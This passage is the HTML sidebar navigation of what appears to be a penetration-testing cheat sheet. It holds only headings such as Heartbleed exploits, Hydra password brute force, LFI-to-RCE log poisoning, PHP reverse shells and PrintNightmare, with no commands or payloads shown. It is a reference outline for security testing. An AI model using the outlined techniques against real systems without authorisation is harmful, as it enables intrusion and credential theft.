class="nav-list-item"><a href="#protocols--ssh--cve-2015-6565--affected" class="nav-list-link">Affected</a></li><li class="nav-list-item"><a href="#protocols--ssh--cve-2015-6565--exploit" class="nav-list-link">Exploit</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#protocols--ssh--cve-2008-0166" class="nav-list-link">CVE-2008-0166</a><ul class="nav-list"><li class="nav-list-item"><a href="#protocols--ssh--cve-2008-0166--affected" class="nav-list-link">Affected</a></li><li class="nav-list-item"><a href="#protocols--ssh--cve-2008-0166--readable--ssh-authorized_keys" class="nav-list-link">Readable .ssh/authorized_keys</a></li><li class="nav-list-item"><a href="#protocols--ssh--cve-2008-0166--other-tools" class="nav-list-link">Other tools</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#protocols--ssh--tricky-commands-configuration" class="nav-list-link">Tricky Commands/Configuration</a><ul class="nav-list"><li class="nav-list-item"><a href="#protocols--ssh--tricky-commands-configuration--posix-remote-directory-tracking" class="nav-list-link">POSIX Remote Directory Tracking</a></li><li class="nav-list-item"><a href="#protocols--ssh--tricky-commands-configuration--plink-exe" class="nav-list-link">PLINK.exe</a></li><li class="nav-list-item"><a href="#protocols--ssh--tricky-commands-configuration--putty-exe" class="nav-list-link">PUTTY.exe</a></li><li class="nav-list-item"><a href="#protocols--ssh--tricky-commands-configuration--ssh" class="nav-list-link">SSH</a></li></ul></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#protocols--distcc" class="nav-list-link">Distcc</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#protocols--distcc--cve-2004-2687" class="nav-list-link">CVE-2004-2687</a><ul class="nav-list"><li class="nav-list-item"><a href="#protocols--distcc--cve-2004-2687--identification" class="nav-list-link">Identification</a></li><li class="nav-list-item"><a href="#protocols--distcc--cve-2004-2687--exploitation" class="nav-list-link">Exploitation</a></li></ul></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#protocols--rdp" class="nav-list-link">RDP</a><ul class="nav-list"><li class="nav-list-item"><a href="#protocols--rdp--windows" class="nav-list-link">Windows</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#protocols--irc" class="nav-list-link">IRC</a><ul class="nav-list"><li class="nav-list-item"><a href="#protocols--irc--linux" class="nav-list-link">Linux</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#protocols--voip" class="nav-list-link">VoIP</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#protocols--voip--sip" class="nav-list-link">SIP</a><ul class="nav-list"><li class="nav-list-item"><a href="#protocols--voip--sip--tools" class="nav-list-link">Tools</a></li><li class="nav-list-item"><a href="#protocols--voip--sip--sip-scan" class="nav-list-link">SIP Scan</a></li><li class="nav-list-item"><a href="#protocols--voip--sip--pbx-extensions-scan" class="nav-list-link">PBX Extensions Scan</a></li></ul></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#protocols--ssl-tls" class="nav-list-link">SSL/TLS</a><ul class="nav-list"><li class="nav-list-item"><a href="#protocols--ssl-tls--scan---test" class="nav-list-link">Scan / Test</a></li><li class="nav-list-item"><a href="#protocols--ssl-tls--downgrade-openssl-system-wide" class="nav-list-link">Downgrade OpenSSL System-wide</a></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#protocols--ssl-tls--heartbleed" class="nav-list-link">Heartbleed</a><ul class="nav-list"><li class="nav-list-item"><a href="#protocols--ssl-tls--heartbleed--affected" class="nav-list-link">Affected</a></li><li class="nav-list-item"><a href="#protocols--ssl-tls--heartbleed--exploits" class="nav-list-link">Exploits</a></li></ul></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#protocols--smtp" class="nav-list-link">SMTP</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#protocols--smtp--user-enumeration" class="nav-list-link">User enumeration</a><ul class="nav-list"><li class="nav-list-item"><a href="#protocols--smtp--user-enumeration--hydra" class="nav-list-link">Hydra</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#protocols--smtp--password-bruteforce" class="nav-list-link">Password Bruteforce</a><ul class="nav-list"><li class="nav-list-item"><a href="#protocols--smtp--password-bruteforce--hydra" class="nav-list-link">Hydra</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#protocols--smtp--email-location" class="nav-list-link">Email Location</a><ul class="nav-list"><li class="nav-list-item"><a href="#protocols--smtp--email-location--linux" class="nav-list-link">Linux</a></li></ul></li><li class="nav-list-item"><a href="#protocols--smtp--send-email---lfi-to-rce" class="nav-list-link">Send Email - LFI to RCE</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#protocols--pop3" class="nav-list-link">POP3</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#protocols--pop3--read-emails" class="nav-list-link">Read Emails</a><ul class="nav-list"><li class="nav-list-item"><a href="#protocols--pop3--read-emails--telnet" class="nav-list-link">Telnet</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#protocols--pop3--password-bruteforce" class="nav-list-link">Password Bruteforce</a><ul class="nav-list"><li class="nav-list-item"><a href="#protocols--pop3--password-bruteforce--hydra" class="nav-list-link">Hydra</a></li></ul></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#protocols--xml-rpc" class="nav-list-link">XML-RPC</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#protocols--xml-rpc--clients" class="nav-list-link">Clients</a><ul class="nav-list"><li class="nav-list-item"><a href="#protocols--xml-rpc--clients--curl" class="nav-list-link">curl</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#protocols--xml-rpc--bruteforce" class="nav-list-link">Bruteforce</a><ul class="nav-list"><li class="nav-list-item"><a href="#protocols--xml-rpc--bruteforce--hydra" class="nav-list-link">Hydra</a></li></ul></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#protocols--ntp" class="nav-list-link">NTP</a><ul class="nav-list"><li class="nav-list-item"><a href="#protocols--ntp--systemd" class="nav-list-link">systemd</a></li><li class="nav-list-item"><a href="#protocols--ntp--ntpdate" class="nav-list-link">ntpdate</a></li></ul></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#web" class="nav-list-link">Web</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#web--certificates" class="nav-list-link">Certificates</a><ul class="nav-list"><li class="nav-list-item"><a href="#web--certificates--crt-sh" class="nav-list-link">crt.sh</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#web--servers" class="nav-list-link">Servers</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#web--servers--apache-http" class="nav-list-link">Apache HTTP</a><ul class="nav-list"><li class="nav-list-item"><a href="#web--servers--apache-http--url-bruteforce---discovery" class="nav-list-link">URL Bruteforce - Discovery</a></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#web--servers--apache-http--log-poisoning---lfi-to-rce" class="nav-list-link">Log Poisoning - LFI to RCE</a><ul class="nav-list"><li class="nav-list-item"><a href="#web--servers--apache-http--log-poisoning---lfi-to-rce--linux" class="nav-list-link">Linux</a></li></ul></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#web--servers--apache-tomcat" class="nav-list-link">Apache Tomcat</a><ul class="nav-list"><li class="nav-list-item"><a href="#web--servers--apache-tomcat--version-reveal-tricks" class="nav-list-link">Version Reveal Tricks</a></li><li class="nav-list-item"><a href="#web--servers--apache-tomcat--url-bruteforce---discovery" class="nav-list-link">URL Bruteforce - Discovery</a></li><li class="nav-list-item"><a href="#web--servers--apache-tomcat--url-reveal-tricks" class="nav-list-link">URL Reveal Tricks</a></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#web--servers--apache-tomcat--jserv---ajp" class="nav-list-link">JServ - AJP</a><ul class="nav-list"><li class="nav-list-item"><a href="#web--servers--apache-tomcat--jserv---ajp--bruteforce-default-credentials" class="nav-list-link">Bruteforce Default Credentials</a></li><li class="nav-list-item"><a href="#web--servers--apache-tomcat--jserv---ajp--ghostcat---cve-2020-1938" class="nav-list-link">Ghostcat - CVE-2020-1938</a></li></ul></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#web--servers--iis" class="nav-list-link">IIS</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#web--servers--iis--file-dir-disclosure" class="nav-list-link">File/Dir Disclosure</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#web--servers--iis--file-dir-disclosure--short-name-enumerator" class="nav-list-link">Short Name Enumerator</a><ul class="nav-list"><li class="nav-list-item"><a href="#web--servers--iis--file-dir-disclosure--short-name-enumerator--sns" class="nav-list-link">sns</a></li><li class="nav-list-item"><a href="#web--servers--iis--file-dir-disclosure--short-name-enumerator--iis-shortname-scanner" class="nav-list-link">IIS shortname Scanner</a></li></ul></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#web--servers--iis--file-extension-bypass" class="nav-list-link">File Extension Bypass</a><ul class="nav-list"><li class="nav-list-item"><a href="#web--servers--iis--file-extension-bypass--information" class="nav-list-link">Information</a></li><li class="nav-list-item"><a href="#web--servers--iis--file-extension-bypass--attack" class="nav-list-link">Attack</a></li></ul></li></ul></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#web--technologies" class="nav-list-link">Technologies</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#web--technologies--cgi" class="nav-list-link">CGI</a><ul class="nav-list"><li class="nav-list-item"><a href="#web--technologies--cgi--shellshock---cve-2014-6271" class="nav-list-link">Shellshock - CVE-2014-6271</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#web--technologies--php" class="nav-list-link">PHP</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#web--technologies--php--login-bypass" class="nav-list-link">Login Bypass</a><ul class="nav-list"><li class="nav-list-item"><a href="#web--technologies--php--login-bypass--array" class="nav-list-link">Array</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#web--technologies--php--code-execution" class="nav-list-link">Code Execution</a><ul class="nav-list"><li class="nav-list-item"><a href="#web--technologies--php--code-execution--system-commands" class="nav-list-link">System Commands</a></li><li class="nav-list-item"><a href="#web--technologies--php--code-execution--bind-reverse-shells" class="nav-list-link">Bind/Reverse Shells</a></li><li class="nav-list-item"><a href="#web--technologies--php--code-execution--protocol-wrappers" class="nav-list-link">Protocol Wrappers</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#web--technologies--php--file-upload" class="nav-list-link">File Upload</a><ul class="nav-list"><li class="nav-list-item"><a href="#web--technologies--php--file-upload--phpinfo---info-php" class="nav-list-link">PHPINFO - info.php</a></li></ul></li><li class="nav-list-item"><a href="#web--technologies--php--object-injection" class="nav-list-link">Object Injection</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#web--technologies--xml" class="nav-list-link">XML</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#web--technologies--xml--injection" class="nav-list-link">Injection</a><ul class="nav-list"><li class="nav-list-item"><a href="#web--technologies--xml--injection--notes" class="nav-list-link">Notes</a></li><li class="nav-list-item"><a href="#web--technologies--xml--injection--xss" class="nav-list-link">XSS</a></li><li class="nav-list-item"><a href="#web--technologies--xml--injection--xxe" class="nav-list-link">XXE</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#web--technologies--xml--xpath-injection" class="nav-list-link">XPath Injection</a><ul class="nav-list"><li class="nav-list-item"><a href="#web--technologies--xml--xpath-injection--xcat" class="nav-list-link">XCat</a></li></ul></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#web--technologies--webdav" class="nav-list-link">WebDAV</a><ul class="nav-list"><li class="nav-list-item"><a href="#web--technologies--webdav--notes" class="nav-list-link">Notes</a></li><li class="nav-list-item"><a href="#web--technologies--webdav--davtest" class="nav-list-link">davtest</a></li><li class="nav-list-item"><a href="#web--technologies--webdav--cadaver" class="nav-list-link">Cadaver</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#web--technologies--lua" class="nav-list-link">LUA</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#web--technologies--lua--decompilation" class="nav-list-link">Decompilation</a><ul class="nav-list"><li class="nav-list-item"><a href="#web--technologies--lua--decompilation--general" class="nav-list-link">General</a></li><li class="nav-list-item"><a href="#web--technologies--lua--decompilation--luadec" class="nav-list-link">luadec</a></li><li class="nav-list-item"><a href="#web--technologies--lua--decompilation--unluac" class="nav-list-link">unluac</a></li></ul></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#web--technologies--template-engines" class="nav-list-link">Template Engines</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#web--technologies--template-engines--manual" class="nav-list-link">Manual</a><ul class="nav-list"><li class="nav-list-item"><a href="#web--technologies--template-engines--manual--detection" class="nav-list-link">Detection</a></li></ul></li><li class="nav-list-item"><a href="#web--technologies--template-engines--cheatsheets" class="nav-list-link">Cheatsheets</a></li><li class="nav-list-item"><a href="#web--technologies--template-engines--flask---jinja2" class="nav-list-link">Flask / Jinja2</a></li><li class="nav-list-item"><a href="#web--technologies--template-engines--tplmap" class="nav-list-link">Tplmap</a></li></ul></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#web--apps" class="nav-list-link">Apps</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#web--apps--adobe-coldfusion" class="nav-list-link">Adobe ColdFusion</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#web--apps--adobe-coldfusion--windows" class="nav-list-link">Windows</a><ul class="nav-list"><li class="nav-list-item"><a href="#web--apps--adobe-coldfusion--windows--administration-login-bypass" class="nav-list-link">Administration Login Bypass</a></li><li class="nav-list-item"><a href="#web--apps--adobe-coldfusion--windows--uploading-an-evil-file" class="nav-list-link">Uploading an evil file</a></li><li class="nav-list-item"><a href="#web--apps--adobe-coldfusion--windows--playing-with-the-cfm-shell" class="nav-list-link">Playing with the CFM shell</a></li></ul></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#web--apps--webmin" class="nav-list-link">Webmin</a><ul class="nav-list"><li class="nav-list-item"><a href="#web--apps--webmin--information" class="nav-list-link">Information</a></li><li class="nav-list-item"><a href="#web--apps--webmin--shellshock---cve-2014-6271" class="nav-list-link">Shellshock - CVE-2014-6271</a></li><li class="nav-list-item"><a href="#web--apps--webmin--privesc" class="nav-list-link">PrivEsc</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#web--apps--citrix" class="nav-list-link">Citrix</a><ul class="nav-list"><li class="nav-list-item"><a href="#web--apps--citrix--login-schema-enumeration" class="nav-list-link">Login Schema Enumeration</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#web--apps--salesforce" class="nav-list-link">Salesforce</a><ul class="nav-list"><li class="nav-list-item"><a href="#web--apps--salesforce--endpoint-enumeration" class="nav-list-link">Endpoint Enumeration</a></li><li class="nav-list-item"><a href="#web--apps--salesforce--endpoint-interaction" class="nav-list-link">Endpoint Interaction</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#web--apps--cms" class="nav-list-link">CMS</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#web--apps--cms--wordpress" class="nav-list-link">Wordpress</a><ul class="nav-list"><li class="nav-list-item"><a href="#web--apps--cms--wordpress--wpscan" class="nav-list-link">WPScan</a></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#web--apps--cms--wordpress--privilege-escalation" class="nav-list-link">Privilege Escalation</a><ul class="nav-list"><li class="nav-list-item"><a href="#web--apps--cms--wordpress--privilege-escalation--database" class="nav-list-link">Database</a></li><li class="nav-list-item"><a href="#web--apps--cms--wordpress--privilege-escalation--uploads" class="nav-list-link">Uploads</a></li><li class="nav-list-item"><a href="#web--apps--cms--wordpress--privilege-escalation--plugins" class="nav-list-link">Plugins</a></li><li class="nav-list-item"><a href="#web--apps--cms--wordpress--privilege-escalation--themes" class="nav-list-link">Themes</a></li><li class="nav-list-item"><a href="#web--apps--cms--wordpress--privilege-escalation--editor" class="nav-list-link">Editor</a></li></ul></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#web--apps--cms--drupal" class="nav-list-link">Drupal</a><ul class="nav-list"><li class="nav-list-item"><a href="#web--apps--cms--drupal--droopescan" class="nav-list-link">droopescan</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#web--apps--cms--joomla" class="nav-list-link">Joomla</a><ul class="nav-list"><li class="nav-list-item"><a href="#web--apps--cms--joomla--joomscan" class="nav-list-link">Joomscan</a></li><li class="nav-list-item"><a href="#web--apps--cms--joomla--joomlascan" class="nav-list-link">JoomlaScan</a></li></ul></li></ul></li></ul></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#software" class="nav-list-link">Software</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#software--windows" class="nav-list-link">Windows</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#software--windows--print-spooler---cve-2021-1675" class="nav-list-link">Print Spooler - CVE-2021-1675</a><ul class="nav-list"><li class="nav-list-item"><a href="#software--windows--print-spooler---cve-2021-1675--detection" class="nav-list-link">Detection</a></li><li class="nav-list-item"><a href="#software--windows--print-spooler---cve-2021-1675--invoke-nightmare" class="nav-list-link">Invoke-Nightmare</a></li><li class="nav-list-item"><a href="#software--windows--print-spooler---cve-2021-1675--cube0x0-impacket-rce---remote" class="nav-list-link">Cube0x0 Impacket RCE - Remote</a></li><li class="nav-list-item"><a href="#software--windows--print-spooler---cve-2021-1675--printerbug-py" class="nav-list-link">printerbug.py</a></li></ul></li></ul></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#sql" class="nav-list-link">SQL</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#sql--sqli" class="nav-list-link">SQLi</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#sql--sqli--bruteforce" class="nav-list-link">Bruteforce</a><ul class="nav-list"><li class="nav-list-item"><a href="#sql--sqli--bruteforce--dictionaries" class="nav-list-link">Dictionaries</a></li><li class="nav-list-item"><a href="#sql--sqli--bruteforce--ffuf" class="nav-list-link">Ffuf</a></li></ul></li><li class="nav-list-item"><a href="#sql--sqli--blind" class="nav-list-link">Blind</a></li><li class="nav-list-item"><a href="#sql--sqli--time-based" class="nav-list-link">Time-based</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#sql--general" class="nav-list-link">General</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#sql--general--find-all-databases" class="nav-list-link">Find all databases</a><ul class="nav-list"><li class="nav-list-item"><a href="#sql--general--find-all-databases--t-sql" class="nav-list-link">T-SQL</a></li></ul></li><li class="nav-list-item"><a href="#sql--general--select-a-database" class="nav-list-link">Select a database</a></li><li class="nav-list-item"><a href="#sql--general--find-all-schemas" class="nav-list-link">Find all schemas</a></li><li class="nav-list-item"><a href="#sql--general--find-all-tables" class="nav-list-link">Find all tables</a></li><li class="nav-list-item"><a href="#sql--general--find-the-columns-in-a-table" class="nav-list-link">Find the columns in a table</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#sql--mysql" class="nav-list-link">MySQL</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#sql--mysql--connection" class="nav-list-link">Connection</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#sql--mysql--connection--linux" class="nav-list-link">Linux</a><ul class="nav-list"><li class="nav-list-item"><a href="#sql--mysql--connection--linux--mysql" class="nav-list-link">mysql</a></li></ul></li></ul></li><li class="nav-list-item"><a href="#sql--mysql--enumeration" class="nav-list-link">Enumeration</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#sql--t-sql--mssql-" class="nav-list-link">T-SQL (MSSQL)</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#sql--t-sql--mssql---connection" class="nav-list-link">Connection</a><ul class="nav-list"><li class="nav-list-item"><a href="#sql--t-sql--mssql---connection--windows" class="nav-list-link">Windows</a></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#sql--t-sql--mssql---connection--linux" class="nav-list-link">Linux</a><ul class="nav-list"><li class="nav-list-item"><a href="#sql--t-sql--mssql---connection--linux--mssqlclient-py" class="nav-list-link">mssqlclient.py</a></li><li class="nav-list-item"><a href="#sql--t-sql--mssql---connection--linux--sqsh" class="nav-list-link">sqsh</a></li></ul></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#sql--t-sql--mssql---linked-servers" class="nav-list-link">Linked Servers</a><ul class="nav-list"><li class="nav-list-item"><a href="#sql--t-sql--mssql---linked-servers--list" class="nav-list-link">List</a></li><li class="nav-list-item"><a href="#sql--t-sql--mssql---linked-servers--execute-queries" class="nav-list-link">Execute Queries</a></li></ul></li><li class="nav-list-item"><a href="#sql--t-sql--mssql---cheatsheets-enumerations" class="nav-list-link">Cheatsheets/Enumerations</a></li><li class="nav-list-item"><a href="#sql--t-sql--mssql---execute-system-commands" class="nav-list-link">Execute System Commands</a></li><li class="nav-list-item"><a href="#sql--t-sql--mssql---execute-scripts" class="nav-list-link">Execute Scripts</a></li><li class="nav-list-item"><a href="#sql--t-sql--mssql---write-text-files-without-xp_cmdshell" class="nav-list-link">Write Text Files Without xp_cmdshell</a></li><li class="nav-list-item"><a href="#sql--t-sql--mssql---create-backup-to-disk" class="nav-list-link">Create Backup to disk</a></li><li class="nav-list-item"><a href="#sql--t-sql--mssql---list-users" class="nav-list-link">List Users</a></li><li class="nav-list-item"><a href="#sql--t-sql--mssql---bruteforce-passwords" class="nav-list-link">Bruteforce Passwords</a></li></ul></li><li class="nav-list-item"><a href="#sql--soql---salesforce-sql" class="nav-list-link">SOQL - Salesforce SQL</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#encryption" class="nav-list-link">Encryption</a><ul class="nav-list"><li class="nav-list-item"><a href="#encryption--notes" class="nav-list-link">Notes</a></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#encryption--websites" class="nav-list-link">Websites</a><ul class="nav-list"><li class="nav-list-item"><a href="#encryption--websites--boxentriq" class="nav-list-link">Boxentriq</a></li><li class="nav-list-item"><a href="#encryption--websites--cyberchef" class="nav-list-link">CyberChef</a></li><li class="nav-list-item"><a href="#encryption--websites--scwf" class="nav-list-link">SCWF</a></li><li class="nav-list-item"><a href="#encryption--websites--crypto-site---one-time-pad" class="nav-list-link">Crypto Site - One Time Pad</a></li><li class="nav-list-item"><a href="#encryption--websites--quipqiup" class="nav-list-link">quipqiup</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a 